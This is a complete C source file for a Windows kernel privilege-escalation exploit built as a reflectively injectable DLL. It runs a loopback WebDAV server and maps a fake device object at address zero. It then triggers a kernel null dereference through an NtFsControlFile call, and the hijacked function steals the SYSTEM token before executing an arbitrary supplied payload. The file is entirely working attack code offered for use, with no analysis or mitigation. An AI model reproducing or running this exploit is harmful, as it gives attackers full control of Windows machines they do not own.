/*
  requires:
    Reflective DLL Injection solution by Stephen Fewer
    https://github.com/stephenfewer/ReflectiveDLLInjection

  compiles with: 
    Visual Studio 2013
*/
#pragma once

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <process.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <winternl.h>
#include <winnetwk.h>
#include <stdio.h>
#include <tchar.h>
#include "defs.h"
#include "ReflectiveLoader.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "mpr.lib")

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

DWORD wdServ(SIZE_T port);
PVOID GetNativeAPI(CHAR *funcName);
PVOID GetKernelAPI(CHAR *kernelImage, PVOID *kernelBase, CHAR *funcName);
static VOID execPayload(LPVOID lpPayload);
NTSTATUS __stdcall tokenTwiddler(DWORD junk1, DWORD junk2);

_ZwOpenProcess pZwOpenProcess = NULL;
_ZwOpenProcessToken pZwOpenProcessToken = NULL;
_ZwDuplicateToken pZwDuplicateToken = NULL;
_ZwSetInformationProcess pZwSetInformationProcess = NULL;
_ZwClose pZwClose = NULL;
_PsLookupProcessByProcessId pPsLookupProcessByProcessId;

PSYSTEM_MODULE_INFORMATION pModuleInfo;
CHAR *KI = 0;       // kernel image name
PVOID *KB = 0;      // kernel base address

BOOL DROP_THE_MIC = FALSE;

extern HINSTANCE hAppInstance;

static VOID execPayload(LPVOID lpPayload)
{
	VOID(*lpCode)() = (VOID(*)())lpPayload;
	lpCode();
	return;
}

DWORD wdServ(SIZE_T port) {
	TCHAR client_data[1500];
	struct sockaddr_in server;
	struct sockaddr_in client;
	SOCKET s1, s2;
	SYSTEMTIME st;
	WSADATA ws;
	int c = sizeof(struct sockaddr_in), test = 0;
	SIZE_T len = 0;
	SIZE_T recv_size = 0;
	time_t _tm;
	struct tm *curtime;
	CHAR *buf, *resp, *token, *token2, *timebuf;

	if (WSAStartup(MAKEWORD(2, 2), &ws) != 0) {
		exit(1);
	}

	if ((s1 = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		exit(1);
	}

	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(port);

	if (bind(s1, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
		exit(1);
	}

	listen(s1, 3);

	while (1) {
		s2 = accept(s1, (struct sockaddr *)&client, &c);

		if (s2 == INVALID_SOCKET) {
			exit(1);
		}

		/* get stuff from client */

		if ((recv_size = recv(s2, client_data, 1500, 0)) == SOCKET_ERROR) {
			exit(1);
		}

		token = strtok(client_data, "  \r\n");

		if (token != NULL) {
			if (strncmp(token, "OPTIONS", 7) == 0) {
				buf = (char *)calloc(3000, 1);

				len += sprintf(buf + len, "HTTP/1.1 200 OK\r\nMS-Author-Via: DAV\r\nDAV: 1,2,1#extend\r\nAllow: OPTIONS,GET,HEAD,PROPFIND\r\n\r\n");

				memset(client_data, 0, 1500);
				send(s2, buf, strlen(buf), 0);
				free(buf);
				len = 0;
			}
			else if (strncmp(token, "PROPFIND", 8) == 0) {
				buf = (char *)calloc(3000, 1);
				resp = (char *)calloc(3500, 1);
				timebuf = (char *)calloc(256, 1);

				token2 = strtok(NULL, " ");
				GetSystemTime(&st);
				_tm = time(NULL);
				curtime = localtime(&_tm);

				sprintf(timebuf, "%04d-%02d-%02dT%02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

				len += sprintf(buf + len, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n");
				len += sprintf(buf + len, "<D:multistatus xmlns:D=\"DAV:\">\r\n");
				len += sprintf(buf + len, "<D:response>\r\n");
				len += sprintf(buf + len, "\t<D:href>%s</D:href>\r\n", token2);
				len += sprintf(buf + len, "\t<D:propstat>\r\n");
				len += sprintf(buf + len, "\t\t<D:prop>\r\n");
				len += sprintf(buf + len, "\t\t<D:creationdate>%sZ</D:creationdate>\r\n", timebuf);
				len += sprintf(buf + len, "\t\t<D:getcontentlength>0</D:getcontentlength>\r\n");
				len += sprintf(buf + len, "\t\t<D:getcontenttype></D:getcontenttype>\r\n");
				len += sprintf(buf + len, "\t\t<D:getetag></D:getetag>\r\n");
				memset(timebuf, 0, sizeof(timebuf));
				sprintf(timebuf, "%.3s, %02d %02d %04d %02d:%02d:%02d GMT", asctime(curtime), st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond);  // needs to look like Fri, 11 Mar 2016 20:39:35 GMT
				len += sprintf(buf + len, "\t\t<D:getlastmodified>%s</D:getlastmodified>\r\n", timebuf);

				if (strstr(token2, "file") != NULL) {
					len += sprintf(buf + len, "\t\t<D:resourcetype></D:resourcetype>\r\n");
				}
				else {
					len += sprintf(buf + len, "\t\t<D:resourcetype><D:collection></D:collection></D:resourcetype>\r\n");
				}
				len += sprintf(buf + len, "\t\t<D:supportedlock></D:supportedlock>\r\n");
				len += sprintf(buf + len, "\t\t<D:ishidden>0</D:ishidden>\r\n");
				len += sprintf(buf + len, "\t\t</D:prop>\r\n");
				len += sprintf(buf + len, "\t\t<D:status>HTTP/1.1 200 OK</D:status>\r\n");
				len += sprintf(buf + len, "\t</D:propstat>\r\n");
				len += sprintf(buf + len, "</D:response>\r\n");
				len += sprintf(buf + len, "</D:multistatus>\r\n");

				len = 0;
				len += sprintf(resp + len, "HTTP/1.1 207 Multi-Status\r\nMS-Author-Via: DAV\r\nDAV: 1,2,1#extend\r\nContent-Length: %d\r\nContent-Type: text/xml\r\n\r\n", strlen(buf));
				len += sprintf(resp + len, buf);
				send(s2, resp, strlen(resp), 0);
				memset(client_data, 0, 1500);
				free(buf);
				free(resp);
				free(timebuf);
				len = 0;
			}
			else {
				buf = (char *)calloc(3000, 1);
				/* request not matched */
				len += sprintf(buf + len, "HTTP/1.1 500 Internal Server Error\r\n\r\n");
				send(s2, buf, strlen(buf), 0);
				memset(client_data, 0, 1500);
				free(buf);
				len = 0;
			}
		}

		/* done at this point */
		closesocket(s2);
	}
	return 0;
}

PVOID GetNativeAPI(CHAR *funcName) {
	return GetProcAddress(GetModuleHandle("ntdll"), funcName);
}

PVOID GetKernelAPI(CHAR *kernelImage, PVOID *kernelBase, CHAR *funcName) {
	PVOID addr = NULL;
	HMODULE hModule = NULL;

	hModule = LoadLibraryExA(kernelImage, 0, DONT_RESOLVE_DLL_REFERENCES);
	if (hModule) {
		addr = GetProcAddress(hModule, funcName);
		if (addr) {
			addr = (PVOID)((PUCHAR)addr - (PUCHAR)hModule + (PUCHAR)kernelBase);
		}
	}
	// printf("[+] DEBUG: %s @ 0x%08x\n", funcName, addr);
	return addr;
}

/*
  the idea for this came from a blog post by j00ru
*/

NTSTATUS __stdcall tokenTwiddler(DWORD junk1, DWORD junk2)
{
	OBJECT_ATTRIBUTES ObjectAttributes;
	HANDLE hSystem = NULL, hToken = NULL, hNewToken = NULL;
	CLIENT_ID ClientId = { (HANDLE)4, NULL };
	PROCESS_ACCESS_TOKEN AccessToken;
	NTSTATUS NtStatus;
	PDWORD CurrentProcess = NULL;
	PDWORD off = NULL;
	DWORD kFlags2Offset = 0x26c;
	DWORD kFlags2, origFlags2, currPid = 0;
	PEPROCESS myEP, systemEP;

	/* Disable the EPROCESS->Flags2 PrimaryTokenFrozen flag */

	currPid = GetCurrentProcessId();
	NtStatus = pPsLookupProcessByProcessId((HANDLE)currPid, &myEP);
	NtStatus = pPsLookupProcessByProcessId((HANDLE)4, &systemEP);
	kFlags2 = *(PDWORD *)((PBYTE)myEP + kFlags2Offset);
	origFlags2 = *(PDWORD *)((PBYTE)myEP + kFlags2Offset);
	kFlags2 = kFlags2 ^ (1 << 15);

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	NtStatus = pZwOpenProcess(&hSystem, GENERIC_ALL, &ObjectAttributes, &ClientId);
	if (!NT_SUCCESS(NtStatus)) {
		goto err;
	}

	NtStatus = pZwOpenProcessToken(hSystem, GENERIC_ALL, &hToken);
	if (!NT_SUCCESS(NtStatus)) {
		return STATUS_UNSUCCESSFUL;
	}

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	NtStatus = pZwDuplicateToken(hToken,
		TOKEN_ALL_ACCESS,
		&ObjectAttributes,
		TRUE,
		TokenPrimary,
		&hNewToken
		);
	if (!NT_SUCCESS(NtStatus)) {
		goto err;
	}

	AccessToken.Token = hNewToken;
	AccessToken.Thread = NULL;

	/* turn flag off */
	*(PDWORD *)((PBYTE)myEP + kFlags2Offset) = kFlags2;
	NtStatus = pZwSetInformationProcess((HANDLE)-1,
		ProcessAccessToken,
		&AccessToken,
		sizeof(PROCESS_ACCESS_TOKEN));
	/* turn flag back on because reasons */
	*(PDWORD)(myEP + kFlags2Offset) = origFlags2;
	if (!NT_SUCCESS(NtStatus)) {
		goto err;
	}
	DROP_THE_MIC = TRUE;
err:
	if (hNewToken != NULL) {
		pZwClose(hNewToken);
	}
	if (hToken != NULL) {
		pZwClose(hToken);
	}
	if (hSystem != NULL) {
		pZwClose(hSystem);
	}

	return 31337;
}

int doWork(LPVOID lpPayload)
{
	HANDLE hThread, hFile;
	IO_STATUS_BLOCK IoStatusBlock;
	ULONG len = 0, inputLen = 24, outputLen = 4;
	DWORD allocSize = 0x4000;
	DWORD allocAddr = 0x00000001;
	NTSTATUS ntRet;
	NETRESOURCE nr, *pnr;
	_NtQuerySystemInformation pNtQuerySystemInformation;
	_NtAllocateVirtualMemory pNtAllocateVirtualMemory;
	_NtFsControlFile pNtFsControlFile;
	SIZE_T port, remoteNameLen = 0;
	DWORD wnacRes, *inputPtr, *outputPtr;
	PBAD_DEVICE_OBJECT pBadDeviceObject;
	char remoteName[64];
	char cfName[64];

	/* gather info and such */

	memset(remoteName, 0, sizeof(remoteName));
	memset(cfName, 0, sizeof(cfName));
	memset(&IoStatusBlock, 0, sizeof(IoStatusBlock));

	pNtQuerySystemInformation = (_NtQuerySystemInformation)GetNativeAPI("NtQuerySystemInformation");
	if (!pNtQuerySystemInformation) {
		exit(1);
	}

	pNtFsControlFile = (_NtFsControlFile)GetNativeAPI("NtFsControlFile");
	if (!pNtFsControlFile) {
		exit(1);
	}

	pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetNativeAPI("NtAllocateVirtualMemory");
	if (!pNtAllocateVirtualMemory) {
		exit(1);
	}

	pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);
	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, &pModuleInfo, sizeof(pModuleInfo), NULL);
	ntRet = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);
	if (!ntRet) {
		exit(1);
	}
	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	ntRet = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, pModuleInfo, len, &len);

	KB = (PVOID *)pModuleInfo->Modules[0].ImageBase;
	KI = (CHAR *)pModuleInfo->Modules[0].FullPathName + pModuleInfo->Modules[0].OffsetToFileName;

	/* finishing information gathering */

	pZwOpenProcess = (_ZwOpenProcess)GetKernelAPI(KI, KB, "ZwOpenProcess");
	pZwOpenProcessToken = (_ZwOpenProcessToken)GetKernelAPI(KI, KB, "ZwOpenProcessToken");
	pZwDuplicateToken = (_ZwDuplicateToken)GetKernelAPI(KI, KB, "ZwDuplicateToken");
	pZwSetInformationProcess = (_ZwSetInformationProcess)GetKernelAPI(KI, KB, "ZwSetInformationProcess");
	pZwClose = (_ZwClose)GetKernelAPI(KI, KB, "ZwClose");
	pPsLookupProcessByProcessId = (_PsLookupProcessByProcessId)GetKernelAPI(KI, KB, "PsLookupProcessByProcessId");

	/* start setting up the trigger */

	srand(time(NULL));
	port = (rand() % (60000 - 5000)) + 5000;

	//printf("[+] Allocating page at 0x00000000 ...\n");
	ntRet = pNtAllocateVirtualMemory((HANDLE)-1, (LPVOID)&allocAddr, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (ntRet != 0) {
		//printf("[-] NtAllocateVirtualMemory error. Status = 0x%08x\n\n", ntRet);
		exit(1);
	}

	pBadDeviceObject = (PBAD_DEVICE_OBJECT)GlobalAlloc(GMEM_ZEROINIT, sizeof(BAD_DEVICE_OBJECT));

	//printf("[+] Building fake DEVICE_OBJECT ...\n");
	pBadDeviceObject->addrPtr = (DWORD)0x00000010;
	pBadDeviceObject->evilAddr = (ULONG)&tokenTwiddler;
	memcpy((PVOID)0x00, pBadDeviceObject, sizeof(BAD_DEVICE_OBJECT));

	//printf("[+] Starting WebDAV server on port %d\n", port);
	hThread = (HANDLE)_beginthread((void *)wdServ, 0, (void *)port);
	//printf("[+] WebDAV thread started, back in main()\n");
	memset(&nr, 0, sizeof(NETRESOURCE));
	sprintf(remoteName, "\\\\127.0.0.1@%d\\folder\\", port);
	sprintf(cfName, "\\\\127.0.0.1@%d\\folder\\file", port);

	pnr = &nr;
	pnr->dwScope = 0;
	pnr->dwType = 0;
	pnr->dwDisplayType = 0;
	pnr->dwUsage = 0;
	pnr->lpLocalName = NULL;
	pnr->lpRemoteName = (LPSTR)&remoteName[0];
	pnr->lpComment = NULL;
	pnr->lpProvider = NULL;

	wnacRes = WNetAddConnection2(&nr, NULL, NULL, (DWORD)0);

//	printf("[+] WNetAddConnection2 result: 0x%08x\n", wnacRes);
	if (wnacRes != 0) {
//		printf("WNetAddConnection2 failed ... wtf\n");
		exit(1);
	}

	hFile = CreateFileA(cfName, FILE_ATTRIBUTE_NORMAL, (DWORD)7, NULL, (DWORD)3, (DWORD)0, NULL);
	inputPtr = (DWORD *)GlobalAlloc(GMEM_ZEROINIT, inputLen);
	outputPtr = (DWORD *)GlobalAlloc(GMEM_ZEROINIT, outputLen);

//	printf("Calling NtFsControlFile ...\n");
	ntRet = pNtFsControlFile(hFile, 0, 0, 0, &IoStatusBlock, 0x900DB, inputPtr, inputLen, outputPtr, outputLen);
//	printf("[+] NtFsControlFile result: 0x%08x\n", ntRet);

	if (DROP_THE_MIC == TRUE) {
		execPayload(lpPayload);
	}
	else {
		/* nothing to do */
	}
//	printf("[+] Done, cya ...\n");
	return 0;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			doWork(lpReserved);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}